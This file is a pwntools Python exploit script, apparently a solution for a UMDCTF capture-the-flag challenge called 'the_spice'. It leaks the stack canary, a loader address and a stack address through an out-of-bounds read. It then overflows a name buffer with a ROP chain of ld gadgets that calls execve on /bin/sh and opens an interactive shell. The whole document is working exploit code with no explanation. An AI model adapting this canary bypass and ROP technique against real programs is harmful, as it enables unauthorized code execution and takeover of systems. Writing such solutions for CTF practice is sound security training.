from pwn import *
from icecream import ic

exe = ELF("./the_spice_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.umdctf.io", 31721)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *0x4016b9
b *0x00000000004017ff
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak(ind):
    sl(b"3")
    sl(f"{ind}".encode())
    ru(f"Buyer {ind}: ".encode())
    tmp1 = u32(re(4))
    ru(b"allocated ")
    tmp2 = int(rl().strip().split()[0])
    return (tmp1, tmp2)

idk = leak(9)

canary = int(hex(idk[0])[2:] + hex(idk[1])[2:], 16)
ic(hex(canary))

idk = leak(13)
ldleak = int(hex(idk[0])[-4:] + hex(idk[1])[2:], 16)
ic(hex(ldleak))
ld.address = ldleak - 0x3a040

idk = leak(12)
stackleak = int(hex(idk[0])[-4:] + hex(idk[1])[2:], 16)
ic(hex(stackleak))
binsh = stackleak - 0x1f4
ic(binsh)

pop_rax_rdx_rbx = ld.address + 0x0000000000020322
pop_rdi = ld.address + 0x000000000000351e
syscall = ld.address + 0x0000000000016629
pop_rsi = ld.address + 0x00000000000054da

payload = b'/bin/sh\x00'
payload += b'a'*(0x14+(0x8*23))
payload += p64(canary)
payload += b'b'*8
payload += p64(pop_rax_rdx_rbx)
payload += p64(59)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(syscall)

ru(">")
sl('1')
ru("Enter the buyer index:")
sl('0')
ru('How long is the buyer\'s name?')
sl('1000')
ru("Enter the buyer's name:")
sl(payload)

ru(">")
sl(b'5')

i()
